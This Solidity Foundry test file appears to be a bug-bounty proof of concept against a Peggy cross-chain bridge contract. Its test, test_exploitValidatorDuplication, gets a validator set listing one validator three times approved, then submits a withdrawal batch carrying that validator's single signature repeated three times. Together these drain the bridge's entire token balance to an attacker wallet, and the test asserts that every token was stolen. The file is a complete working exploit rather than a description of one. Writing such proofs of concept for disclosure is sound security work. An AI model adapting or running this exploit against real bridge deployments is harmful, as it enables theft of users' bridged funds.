// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; // Explicitly import OZ's IERC20 to resolve conflict
import "../src/Peggy.sol";
import "../src/CosmosERC20.sol";

// Extended interface to include decimals() and symbol() methods
interface IERC20Extended is IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

// Copied from Immunefi's PoC.sol to resolve dependency conflicts
struct TokenBalance {
    IERC20Extended token;
    int256 amount;
}

contract PeggyPocTest is Test {
    // ## Target Contracts
    Peggy internal peggy;
    CosmosERC20 internal dummyToken;

    // ## State & Constants
    bytes32 constant PEGGY_ID = keccak256("peggy-id");
    uint256 constant POWER_THRESHOLD = 67 * 10**16;

    // ## Actors & Private Keys
    address internal attackerWallet = makeAddr("attackerWallet");
    
    uint256 internal validatorA_pk = 0xA;
    address internal validatorA = vm.addr(validatorA_pk);
    uint256 internal validatorB_pk = 0xB;
    address internal validatorB = vm.addr(validatorB_pk);
    uint256 internal validatorC_pk = 0xC;
    address internal validatorC = vm.addr(validatorC_pk);
    
    ValsetArgs internal honestValset;
    ValsetArgs internal maliciousValset;
    
    IERC20Extended[] internal tokensToTrack;

    // --- Start of code copied from Immunefi's PoC.sol ---
    mapping(address => TokenBalance[][]) public tokensBalance;
    mapping(address => string) public names;

    function setAlias(address _user, string memory _alias) public {
        names[_user] = _alias;
    }

    function snapshotAndPrint(address _user, IERC20Extended[] memory _tokens) public returns (uint256 index) {
        TokenBalance[] memory tokenBalances = new TokenBalance[](_tokens.length);
        index = tokensBalance[_user].length;
        tokensBalance[_user].push();
        for (uint256 i = 0; i < _tokens.length; i++) {
            uint256 tokenBalance = address(_tokens[i]) != address(0x0) ? _tokens[i].balanceOf(_user) : _user.balance;
            require(tokenBalance <= uint256(type(int256).max), "PoC: balance too large");
            tokenBalances[i].token = _tokens[i];
            tokenBalances[i].amount = int256(tokenBalance);
            tokensBalance[_user][index].push(tokenBalances[i]);
        }
        printBalance(_user, index);
    }

    function printBalance(address _user, uint256 _index) public view {
        string memory resolvedAddress = _resolveAddress(_user);
        console.log("~~~ Balance of [%s] at block #%s", resolvedAddress, block.number);
        console.log("-----------------------------------------------------------------------------------------");
        console.log("                  Token address                                |      Symbol  |      Balance");
        console.log("-----------------------------------------------------------------------------------------");
        
        for (uint256 j = 0; j < tokensBalance[_user][_index].length; j++) {
            uint256 balance = uint256(tokensBalance[_user][_index][j].amount);

            uint256 d = address(tokensBalance[_user][_index][j].token) != address(0x0)
                ? tokensBalance[_user][_index][j].token.decimals()
                : 18;
            uint256 integer_part = balance / (10 ** d);
            string memory fractional_part_string;
            {
                uint256 fractional_part = balance % (10 ** d);
                string memory fractional_part_leading_zeros;

                if (fractional_part > 0) {
                    uint256 leading_zeros = d - (log10(fractional_part) + 1);
                    for (uint256 i = 0; i < leading_zeros; i++) {
                        fractional_part_leading_zeros = string.concat(fractional_part_leading_zeros, "0");
                    }
                } else {
                     for (uint256 i = 0; i < d; i++) {
                        fractional_part_leading_zeros = string.concat(fractional_part_leading_zeros, "0");
                    }
                }

                fractional_part_string = string.concat(fractional_part_leading_zeros, toString(fractional_part));
            }

            string memory symbol = address(tokensBalance[_user][_index][j].token) != address(0x0)
                ? tokensBalance[_user][_index][j].token.symbol()
                : "NATIVE";

            string memory template = string.concat(toAsciiString(address(tokensBalance[_user][_index][j].token)), "\t|\t", symbol, "\t|\t%s.%s");
            console.log(template, integer_part, fractional_part_string);
        }
        console.log("");
    }

    function _resolveAddress(address _user) internal view returns (string memory) {
        return bytes(names[_user]).length != 0 ? names[_user] : toAsciiString(_user);
    }

    function toAsciiString(address x) internal pure returns (string memory) {
        bytes memory s = new bytes(40);
        for (uint256 i = 0; i < 20; i++) {
            bytes1 b = bytes1(uint8(uint256(uint160(x)) >> (8 * (19 - i))));
            bytes1 hi = bytes1(uint8(b) / 16);
            bytes1 lo = bytes1(uint8(b) - 16 * uint8(hi));
            s[2 * i] = char(hi);
            s[2 * i + 1] = char(lo);
        }
        return string.concat("0x", string(s));
    }

    function char(bytes1 b) internal pure returns (bytes1) {
        if (uint8(b) < 10) return bytes1(uint8(b) + 0x30);
        else return bytes1(uint8(b) + 0x57);
    }

    bytes16 private constant HEX_DIGITS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 length = log10(value) + 1;
        string memory buffer = new string(length);
        uint256 ptr;
        assembly {
            ptr := add(buffer, add(32, length))
        }
        while (true) {
            ptr--;
            assembly {
                mstore8(ptr, byte(mod(value, 10), HEX_DIGITS))
            }
            value /= 10;
            if (value == 0) break;
        }
        return buffer;
    }

    function log10(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >= 10 ** 64) { value /= 10 ** 64; result += 64; }
            if (value >= 10 ** 32) { value /= 10 ** 32; result += 32; }
            if (value >= 10 ** 16) { value /= 10 ** 16; result += 16; }
            if (value >= 10 ** 8) { value /= 10 ** 8; result += 8; }
            if (value >= 10 ** 4) { value /= 10 ** 4; result += 4; }
            if (value >= 10 ** 2) { value /= 10 ** 2; result += 2; }
            if (value >= 10 ** 1) { result += 1; }
        }
        return result;
    }
    // --- End of code copied from Immunefi's PoC.sol ---

    function setUp() public {
        peggy = new Peggy();
        dummyToken = new CosmosERC20("Dummy Token", "DUMMY");

        address[] memory validators = new address[](3);
        validators[0] = validatorA;
        validators[1] = validatorB;
        validators[2] = validatorC;
        
        uint256[] memory powers = new uint256[](3);
        powers[0] = 34 * 10**16;
        powers[1] = 33 * 10**16;
        powers[2] = 33 * 10**16;

        honestValset = ValsetArgs(validators, powers, 0, 0, address(0));
        peggy.initialize(PEGGY_ID, POWER_THRESHOLD, validators, powers);

        uint256 initialBridgeFunds = 1_000_000 ether;
        dummyToken.mint(address(peggy), initialBridgeFunds);
        
        setAlias(address(peggy), "Peggy Bridge");
        setAlias(attackerWallet, "Attacker Wallet");
        tokensToTrack.push(IERC20Extended(address(dummyToken)));

        console.log("--- Initial State ---");
        snapshotAndPrint(address(peggy), tokensToTrack);
        snapshotAndPrint(attackerWallet, tokensToTrack);
    }

    function test_exploitValidatorDuplication() public {
        console.log("\n--- Attack Step 1: Proposing Malicious Valset ---");
        
        address[] memory maliciousValidators = new address[](3);
        maliciousValidators[0] = validatorA;
        maliciousValidators[1] = validatorA;
        maliciousValidators[2] = validatorA;

        uint256[] memory maliciousPowers = new uint256[](3);
        maliciousPowers[0] = 34 * 10**16;
        maliciousPowers[1] = 33 * 10**16;
        maliciousPowers[2] = 33 * 10**16;

        maliciousValset = ValsetArgs(maliciousValidators, maliciousPowers, 1, 0, address(0));

        bytes32 newCheckpoint = peggy.makeCheckpoint(maliciousValset, PEGGY_ID);
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", newCheckpoint));
        
        (uint8 vA, bytes32 rA, bytes32 sA) = vm.sign(validatorA_pk, digest);
        (uint8 vB, bytes32 rB, bytes32 sB) = vm.sign(validatorB_pk, digest);

        uint8[] memory v = new uint8[](3);
        v[0] = vA; v[1] = vB; v[2] = 0;
        
        bytes32[] memory r = new bytes32[](3);
        r[0] = rA; r[1] = rB; r[2] = bytes32(0);

        bytes32[] memory s = new bytes32[](3);
        s[0] = sA; s[1] = sB; s[2] = bytes32(0);

        peggy.updateValset(maliciousValset, honestValset, v, r, s);
        assertEq(peggy.state_lastValsetNonce(), 1, "Valset update should succeed");
        console.log("Success: Malicious validator set has been approved and is now active.");

        console.log("\n--- Attack Step 2: Draining Funds with Amplified Power ---");
        console.log("Attacker Wallet Balance before drain:");
        snapshotAndPrint(attackerWallet, tokensToTrack);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = dummyToken.balanceOf(address(peggy));
        
        address[] memory destinations = new address[](1);
        destinations[0] = attackerWallet;

        uint256[] memory fees = new uint256[](1);
        fees[0] = 0;
        
        uint256 batchNonce = 1;
        uint256 batchTimeout = block.number + 100;
        
        bytes32 batchDigest = keccak256(
            abi.encode(
                PEGGY_ID,
                0x7472616e73616374696f6e426174636800000000000000000000000000000000,
                amounts, destinations, fees, batchNonce, address(dummyToken), batchTimeout
            )
        );
        bytes32 finalDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", batchDigest));
        
        (uint8 attacker_v, bytes32 attacker_r, bytes32 attacker_s) = vm.sign(validatorA_pk, finalDigest);

        uint8[] memory batch_v = new uint8[](3);
        batch_v[0] = attacker_v; batch_v[1] = attacker_v; batch_v[2] = attacker_v;
        
        bytes32[] memory batch_r = new bytes32[](3);
        batch_r[0] = attacker_r; batch_r[1] = attacker_r; batch_r[2] = attacker_r;

        bytes32[] memory batch_s = new bytes32[](3);
        batch_s[0] = attacker_s; batch_s[1] = attacker_s; batch_s[2] = attacker_s;

        peggy.submitBatch(
            maliciousValset, batch_v, batch_r, batch_s,
            amounts, destinations, fees, batchNonce, address(dummyToken), batchTimeout
        );
        
        console.log("Success: `submitBatch` executed with a single signature.");
        
        console.log("\n--- Final State ---");
        snapshotAndPrint(address(peggy), tokensToTrack);
        snapshotAndPrint(attackerWallet, tokensToTrack);

        uint256 initialBridgeFunds = 1_000_000 ether;
        assertEq(dummyToken.balanceOf(address(peggy)), 0, "Bridge balance should be zero");
        assertEq(dummyToken.balanceOf(attackerWallet), initialBridgeFunds, "Attacker should have all funds");
        
        console.log("\nVulnerability Confirmed: All funds stolen.");
    }
}
